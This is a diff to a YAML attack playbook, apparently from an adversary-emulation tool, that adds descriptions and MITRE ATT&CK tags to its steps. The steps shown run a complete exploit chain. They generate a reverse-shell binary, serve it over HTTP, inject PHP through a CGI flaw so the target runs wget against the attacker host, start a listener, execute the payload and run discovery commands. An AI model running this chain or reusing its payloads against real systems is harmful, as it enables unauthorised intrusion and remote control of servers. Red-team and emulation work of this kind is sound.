@@ -29,6 +29,8 @@ commands:
   - type: mktemp
     cmd: file
     variable: RSHELL
+    metadata:
+      description: "Prepare directory for reverse shell"
 
   # generate reverse shell
   - type: msf-payload
@@ -38,16 +40,22 @@ commands:
       LPORT: $LPORT
     format: elf
     local_path: $RSHELL
+    metadata:
+      description: "Generate php reverse shell"
 
   # serve the reverse shell via webserver in background mode
   - type: webserv
     local_path: $RSHELL
     port: 8080
     background: true
+    metadata:
+      description: "Serve reverse shell via webserver in background mode"
 
   # create raw PHP body for the download request
   - type: shell
     cmd: "cat > $PHP_DOWNLOAD <<'EOF'\n<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL');?>\nEOF"
+    metadata:
+      description: "Prepare cgi exploit"
 
   # Inject code that downloads the reverse shell from the webserver
   - type: http-client
@@ -58,6 +66,10 @@ commands:
       Accept-Encoding: identity
       Connection: close
     local_path: $PHP_DOWNLOAD
+    metadata:
+      description: "Exploit php cgi code injection and place a payload for a reverse shell"
+      techniques: "T1190,T1059.004"
+      tactics: "Initial Access,Execution"
 
   # Start a reverse shell listener in background
   - type: msf-module
@@ -69,10 +81,14 @@ commands:
       LPORT: $LPORT
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Start local listener for reverse shell"
 
   # create raw PHP body for the execution request
   - type: shell
     cmd: "cat > $PHP_EXECUTE <<'EOF'\n<?php system('chmod +x /tmp/shell && /tmp/shell &');?>\nEOF"
+    metadata:
+      description: "create raw PHP body for the execution request"
 
   # Execute the reverse shell
   - type: http-client
@@ -85,12 +101,25 @@ commands:
     local_path: $PHP_EXECUTE
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Exploit php cgi code injection and trigger the reverse shell"
+      techniques: "T1190,T1059.004"
+      tactics: "Initial Access,Execution"
 
   # Run commands using the reverse shell
   - type: msf-session
     session: shell
     cmd: sysinfo
+    metadata:
+      description: "Retrieve system information"
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: msf-session
     session: shell
     cmd: getuid
+    metadata:
+      description: "Get information about current user"
+      techniques: "T1033"
+      tactics: "Discovery"
+
